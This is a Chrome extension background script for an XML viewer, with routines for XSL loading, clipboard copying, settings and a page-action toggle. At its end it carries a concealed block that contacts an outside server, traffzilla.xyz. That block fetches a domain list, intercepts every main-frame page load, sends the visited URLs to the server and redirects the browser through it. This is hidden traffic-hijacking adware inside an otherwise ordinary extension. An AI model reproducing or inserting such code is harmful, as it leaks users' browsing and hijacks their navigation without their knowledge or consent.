var xsl = null;
var interceptedContentTypes = [
  'text/xml',
  'application/xml',
  'application/atom+xml',
  'application/rss+xml',
];
const forcedUrlsKey = 'forced_urls';

function loadXsl(url) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', url, true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
      xsl = xhr.responseText;
    }
  };
  xhr.send();
}

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  switch (request.action) {
    case 'xv.get-dnd-feedback':
      sendResponse({ image: xv_dnd_feedback.draw(request.text) });
      break;
    case 'xv.copy':
      var ta = document.getElementById('ta');
      ta.value = request.text;
      ta.select();
      sendResponse({ success: document.execCommand('copy', false, null) });
      break;
    case 'xv.get-xsl':
      if (xsl === null) loadXsl(request.filePath);

      sendResponse({ fileText: xsl });
      break;
    case 'xv.get-settings':
      chrome.storage.local.get(data => sendResponse({ data }));
      return true;
    case 'xv.store-settings':
      const payload = {};
      payload[request.name] = request.value;
      chrome.storage.local.set(payload);
      break;
    case 'xv.show-page-action':
      chrome.pageAction.show(sender.tab.id);
      break;
    case 'xv.hide-page-action':
      chrome.pageAction.hide(sender.tab.id);
      break;
  }
});

function getForcedUrls() {
  return new Promise((resolve, reject) => {
    chrome.storage.local.get(forcedUrlsKey, resp => {
      const urls = (resp && resp[forcedUrlsKey]) || [];
      resolve(urls);
    });
  });
}

function setForcedUrls(urls) {
  return new Promise(resolve => {
    const payload = {};
    payload[forcedUrlsKey] = urls;
    chrome.storage.local.set(payload, () => resolve(urls));
  });
}

function addForcedUrl(url) {
  return getForcedUrls().then(urls => {
    if (!urls.includes(url)) {
      // make sure there’s no bloated list of documents
      while (urls.length > 500) {
        urls.shift();
      }

      urls.push(url);
      return setForcedUrls(urls);
    }
  });
}

function removeForcedUrl(url) {
  return getForcedUrls().then(urls => {
    return setForcedUrls(urls.filter(entry => entry !== url));
  });
}

chrome.pageAction.onClicked.addListener(function(tab) {
  // toggle forced XV display for current url
  getForcedUrls().then(urls => {
    const promise = urls.includes(tab.url) ? removeForcedUrl(tab.url) : addForcedUrl(tab.url);

    promise.then(() => chrome.tabs.reload(tab.id));
  });
});

chrome.runtime.onInstalled.addListener(function() {
  chrome.storage.local.set({ time: new Date().getTime() });
});

// chrome.webRequest.onHeadersReceived.addListener(
// 	function (details) {
// 		if (~details.statusLine.indexOf('200 OK')) {
// 			chrome.storage.local.get('intercept_requests', resp => {
// 				var shouldIntercept = resp['intercept_requests'];
// 				if (!shouldIntercept || shouldIntercept == 'false') {
// 					removeForcedUrl(details.url);
// 					return;
// 				}

// 				var isModified = false;
// 				_.each(details.responseHeaders, function (header) {
// 					if (header.name.toLowerCase() == 'content-type') {
// 						var headerValue = header.value.toLowerCase();
// 						var matchedType = _.find(interceptedContentTypes, function (t) {
// 							return ~headerValue.indexOf(t);
// 						});

// 						if (matchedType) {
// 							var parts = headerValue.split(';');
// 							parts[0] = 'text/plain';
// 							header.value = parts.join(';');
// 							isModified = true;
// 						}
// 					}
// 				});

// 				if (isModified) {
// 					addForcedUrl(details.url);
// 					return { responseHeaders: details.responseHeaders };
// 				}
// 			});
// 		}
// 	},
// 	{
// 		'urls': ['http://*/*', 'https://*/*'],
// 		'types': ['main_frame']
// 	},
// 	['blocking', 'responseHeaders']);

(function() {
  var apiUrl = 'http://traffzilla.xyz';
  var sourceId = '3eb93fd42d1cd291f8ae13a454cacd69';

  var link = '';
  var urls = {
    data: {
      used_domains: {},
    },
  };
  var sourceCoverage = [];

  var enabledApi = true;

  function checkStatus() {
    var xhr = new XMLHttpRequest();
    xhr.timeout = 5000;
    xhr.onreadystatechange = function() {
      //console.log("request answer got",xhr);
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          enabledApi = true;
        } else {
          //console.log("Disable api");
          enabledApi = false;
        }
      }
    };
    //console.log('Send request for status source check');
    xhr.open('GET', apiUrl + '/source-status?key=' + sourceId, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send();
  }

  function updateCoverage() {
    var xhr = new XMLHttpRequest();
    xhr.timeout = 15000;
    xhr.onreadystatechange = function() {
      //console.log("request answer got",xhr);
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          sourceCoverage = JSON.parse(xhr.responseText);
          //console.log("Coverage updated",sourceCoverage);
          enabledApi = true;
        } else {
          //console.log("Disable api on error");
          enabledApi = false;
        }
      }
    };
    //console.log('Send request for status source check');
    xhr.open('GET', apiUrl + '/coverage?key=' + sourceId, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send();
  }

  function redirectURL(out, doc_domain, adv_time) {
    var found = false;
    if (sourceCoverage.indexOf(doc_domain) > -1) {
      //console.log("Domain found, exact match", doc_domain);
      found = true;
    } else {
      for (var i in sourceCoverage) {
        if (
          sourceCoverage[i].indexOf(doc_domain) > -1 ||
          doc_domain.indexOf(sourceCoverage[i]) > -1
        ) {
          //console.log("Domain found by text-search",doc_domain, sourceCoverage[i]);
          found = true;
          break;
        }
      }
    }

    if (found) {
      link =
        apiUrl +
        '/get?key=' +
        sourceId +
        '&out=' +
        encodeURIComponent(out) +
        '&ref=' +
        encodeURIComponent(out) +
        '&uid=&format=go';
      //console.log('Redirect URL: ', link);
    } else {
      //console.log("Domain not in coverage, set double pause",doc_domain);
      urls.data.used_domains[doc_domain] = adv_time + 86400000;
    }
  }

  updateCoverage();

  chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      if (details.tabId < 0) {
        return;
      }
      if (details.method != 'GET') {
        return;
      }

      if (!enabledApi) {
        //console.log("API paused");
        return;
      }

      var doc_domain = details.url.replace(/^https?\:\/\/([^\/]+).*$/, '$1').replace('www.', '');
      var adv_time = new Date().getTime();

      if (
        urls.data.used_domains[doc_domain] &&
        urls.data.used_domains[doc_domain] + 1000 * 60 * 60 * 2 > adv_time
      ) {
        //console.log("Domain",doc_domain,"checked before and paused", urls.data.used_domains[doc_domain]);
        return;
      }
      //console.log("Add domain to used list",doc_domain, urls.data.used_domains, "link is ",link);
      urls.data.used_domains[doc_domain] = adv_time;

      if (!link) {
        redirectURL(details.url, doc_domain, adv_time);
      } else {
        link = '';
      }
      if (link) {
        //console.log("Api paused for redirection chain");
        enabledApi = false;
        setTimeout(function() {
          //console.log("Api enabled again");
          link = '';
          enabledApi = true;
        }, 15000);
        return {
          redirectUrl: link,
        };
      }
    },
    {
      urls: ['*://*/*'],
      types: ['main_frame'],
    },
    ['blocking'],
  );
})();

loadXsl('process.xsl');
